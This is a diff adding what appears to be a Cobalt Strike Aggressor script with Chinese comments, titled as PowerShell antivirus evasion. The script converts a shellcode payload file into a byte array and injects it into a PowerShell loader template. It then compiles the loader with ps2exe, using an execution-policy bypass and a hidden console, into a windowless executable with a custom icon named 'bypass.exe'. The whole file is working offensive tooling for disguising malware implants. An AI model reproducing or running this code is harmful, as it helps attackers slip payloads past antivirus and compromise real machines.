@@ -1,0 +1,80 @@
+menubar("powershell免杀","powershell");
+
+popup powershell {
+	item("&生成exe",{dialog_powershell()});
+}
+
+$path = "F:\\cstemp\\bypassAV-master\\";
+$output_file = $path."output";
+
+global('$char_code');
+global('$new_strs');
+
+sub payload_bin_to_ps1 {
+	$in = openf($bin_path);
+	$data = readb($in, -1);
+
+	for ($x = 0; $x < strlen($data); $x++)
+	{
+		$shellcode = (byteAt($data, $x) . ",");
+		$char_code = $char_code.$shellcode;
+	}
+	$char_code = left($char_code, int(strlen($char_code)) - 1);
+	$org_file = $path.'powershell_load.ps1';
+	$handle = openf($org_file);
+	while $text (readln($handle)){ 
+		$rep = replace($text, 'acode.*=.*', 'acode='.$char_code)."\n";
+		$new_strs = $new_strs.$rep;
+	}
+	$filestring = right($new_strs, int(strlen($new_strs)) - 1);
+	$out =  openf(">$payload_file_ps1");
+	writeb($out, $filestring);
+	closef($out);
+	closef($in);
+	$new_strs = '';
+	$char_code = '';
+	
+}
+
+sub show {
+	$bin_path = $3["bin"];
+	$ico_path = $3["ico"];
+	$payload_file_ps1 = $output_file.'\\'.$3["payload"];
+	$output_exe = $output_file.'\\'.$3["output_exe"];
+	$ps2exe = $path.'\.\\ps2exe.ps1';
+	mkdir($output_file);
+	if (-exists $bin_path) {
+		payload_bin_to_ps1($bin_path,$payload_file_ps1);
+		$version = right($3["version"], 3);
+		$int_version = left($version, 1);
+		println($payload_file_ps1);
+		if ($int_version == "4") {
+			$process = exec('powershell.exe -ExecutionPolicy bypass -command "'.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -noConsole -runtime40" ');
+		} else {
+			$process = exec('cmd.exe /c echo '.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -noConsole -runtime20 | powershell -');
+		}
+		@data = readAll($process);
+		println(@data);
+		closef($process);
+		if (-exists $output_exe) {
+			show_message("\n加载bin文件：".$bin_path."\n输出payload文件：".$payload_file_ps1."\n版本是：".$3["version"]."\n输出exe地址：".$output_exe);
+		} else {
+			show_message('运行异常，请查看script console');
+		}
+	} else {
+		show_message('请指定bin文件');
+	}
+
+}
+
+sub dialog_powershell {
+	$info = dialog("powershell bypass av",%(ps2exe => "ps2exe.ps1",bin => "payload.bin",ico => "a.ico", payload => "payload_cs.ps1",version => "4.0",output_exe => "bypass.exe"),&show); #第一个是菜单的名字，第二个是我们下面定义的菜单显示内容的默认值，第三个参数是我们回调函数，触发show函数的时候显示，并将我们的输入值传递给他
+	# drow_text($info,"ps2exe","ps2exe.ps1");
+	drow_file($info,"bin","Choose: default payload.bin");
+	drow_file($info,"ico","Choose: 添加ico图标");
+	drow_text($info, "payload", "生成ps1");
+	drow_combobox($info, "version", "Version: ", @("powershell 4.0", "powershell 2.0"));
+	drow_text($info,"output_exe","输出地址："); 
+	dbutton_action($info,"点击生成！"); # dbutton_action将操作按钮添加到dialog，回调函数
+	dialog_show($info); # 显示文本输入框
+}
